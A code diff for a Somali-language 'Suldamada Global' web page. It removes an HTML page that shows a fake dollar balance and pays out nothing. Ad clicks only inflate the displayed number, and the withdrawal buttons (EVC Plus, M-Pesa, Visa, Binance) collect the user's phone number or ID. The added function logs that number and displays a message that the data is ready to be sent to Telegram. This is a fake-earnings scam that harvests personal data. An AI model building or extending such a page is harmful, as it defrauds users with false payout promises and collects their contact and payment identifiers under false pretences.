@@ -1,61 +1,16 @@
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Suldamada Global</title>
-    <style>
-        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
-        .app-container { width: 100%; max-width: 400px; background: #1e293b; padding: 25px; border-radius: 30px; }
-        .balance-card { background: linear-gradient(135deg, #f59e0b, #ec4899); padding: 30px; border-radius: 25px; text-align: center; margin-bottom: 25px; }
-        input { width: 100%; padding: 18px; margin-bottom: 20px; border-radius: 50px; border: none; background: #0f172a; color: white; text-align: center; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 50px; border: none; cursor: pointer; font-weight: bold; color: white; text-decoration: none; display: block; text-align: center; transition: 0.3s; }
-        .btn-ad { background: #6366f1; margin-bottom: 20px; }
-        .btn-evc { background: #10b981; }
-        .btn-mpesa { background: #ec4899; }
-        .btn-visa { background: #3b82f6; }
-        .btn-binance { background: #f59e0b; }
-    </style>
-</head>
-<body>
-    <div class="app-container">
-        <h2 style="text-align:center">Suldamada Global</h2>
-        <div class="balance-card">
-            <p>Haraagaaga</p>
-            <h1>$<span id="balance">32.75</span></h1>
-        </div>
-        
-        <a href="https://omg10.com/4/11075110" target="_blank" class="btn btn-ad" onclick="addMoney()">Watch Ad to Earn $5.50</a>
-        
-        <input type="text" id="phone" placeholder="Geli lambarkaaga ama ID-gaaga">
-        
-        <!-- Badhanada Lacag Bixinta -->
-        <button class="btn btn-evc" onclick="checkWithdraw('EVC Plus')">Withdraw EVC Plus</button>
-        <button class="btn btn-mpesa" onclick="checkWithdraw('M-Pesa')">Withdraw M-Pesa</button>
-        <button class="btn btn-visa" onclick="checkWithdraw('Visa')">Withdraw Visa</button>
-        <button class="btn btn-binance" onclick="checkWithdraw('Binance')">Withdraw Binance</button>
-    </div>
+// Qaybtaan geli koodhkaaga script-ka
+function checkWithdraw(method) {
+    let balance = parseFloat(document.getElementById('balance').innerText);
+    let phone = document.getElementById('phone').value;
 
-    <script>
-        function addMoney() {
-            let balanceEl = document.getElementById('balance');
-            let balance = parseFloat(balanceEl.innerText);
-            balance += 5.50;
-            balanceEl.innerText = balance.toFixed(2);
-        }
-
-        function checkWithdraw(method) {
-            let balance = parseFloat(document.getElementById('balance').innerText);
-            let phone = document.getElementById('phone').value;
-
-            if (balance < 50) {
-                alert("Waan ka xunnahay! Lacagta ugu yar ee la bixi karo waa $50. Sii wad daawashada xayeysiiska.");
-            } else if (phone.length < 5) {
-                alert("Fadlan geli lambar ama ID sax ah.");
-            } else {
-                alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
-            }
-        }
-    </script>
-</body>
-</html>
+    console.log("Testing: " + method + " | Balance: " + balance + " | Phone: " + phone);
+    
+    if (balance < 50) {
+        alert("System check: Haraagu waa ka yar yahay $50 (Wuu shaqaynayaa).");
+    } else if (phone.length < 5) {
+        alert("System check: Lambarku waa gaaban yahay (Wuu shaqaynayaa).");
+    } else {
+        alert("System check: System-ku wuxuu diyaar u yahay inuu xogta u diro Telegram-ka (" + method + ").");
+    }
+}
